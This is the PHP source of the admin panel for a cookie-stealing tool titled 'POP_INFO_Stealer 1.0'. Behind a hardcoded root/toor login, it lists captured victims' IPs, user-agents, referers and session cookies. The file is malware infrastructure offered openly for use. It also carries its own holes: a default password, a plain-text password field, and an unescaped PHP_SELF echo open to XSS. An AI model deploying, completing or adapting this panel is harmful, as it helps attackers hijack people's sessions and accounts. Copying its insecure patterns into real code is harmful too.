<?php  ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta http-equiv="Content-Style-Type" CONTENT="text/css">
<meta name="robots" content="index, follow, all" />
<meta name="description" content="POP_INFO_Stealer 1.0" />
<meta name="keywords" content="POP_INFO_Stealer 1.0" />
<meta name="author" CONTENT="shiky8">
<title>POP_INFO_Stealer 1.0</title>
<style type="text/css">
<!--
body,td,th {
	color: #FF0033;
}
body {
	background-color: #000000;
}
.Style1 {
	color: #00CC33;
	font-weight: bold;
}
-->
</style></head>
<body>
<table width="535" border="1" align="center">
  <tr>
    <td width="525"><div align="center"><span class="Style1">POP_INFO_Stealer 1.0</span></div></td>
  </tr>
</table>
<p>&nbsp;</p>
<p><?php
$LOGIN="root";  //login
$PASSWD="toor";   //password
if ($_POST['logintext']==$LOGIN && $_POST['passwdtext']==$PASSWD) {  ?>
<html>
<body>
<p><br />
Cookies:</p>
<table width="726" border="1">
<tr><td>ID:</td><td>IP:</td><td>Host:</td><td>User-Agent:</td><td>Date:</td><td>Time:</td><td>Referer:</td><td>Cookie:</td></tr>
<!-- Breakpoint -->
</table>
<p>&nbsp;</p>
<table width="535" border="1" align="center">
  <tr>
    <td width="525"><div align="center"><span class="Style1"><a href="https://github.com/shiky8/">shiky8 Mohamed shahat</a></span></div></td>
  </tr>
</table>
</body>
</html>

<?php } else { ?>
<html>
<body>
<p>Log in to continue</p>
<form name="connexion" action="<?php echo ($_SERVER['PHP_SELF']); ?>" method="post">
  <table width="298" border="1">
<tr>
        <td width="102">Login :</td>
      <td width="180"><input name="logintext" type="text" size="30" maxlength="30" /></td>
      </tr>
      <tr>
        <td>Password :</td>
        <td><input name="passwdtext" type="text" size="30" maxlength="30" /></td>
      </tr>
    </table>
  <table width="298" border="0">
    <tr>
      <td><div align="center">
        <input name="envoi" type="submit" value="-= Connect =-" />
      </div></td>
    </tr>
  </table>
  </form>
  <p>&nbsp;</p>
<table width="535" border="1" align="center">
  <tr>
    <td width="525"><div align="center"><span class="Style1"><a href="https://github.com/shiky8/">shiky8 Mohamed shahat</a></span></div></td>
  </tr>
</table>
</body>
</html>
<?php } ?>

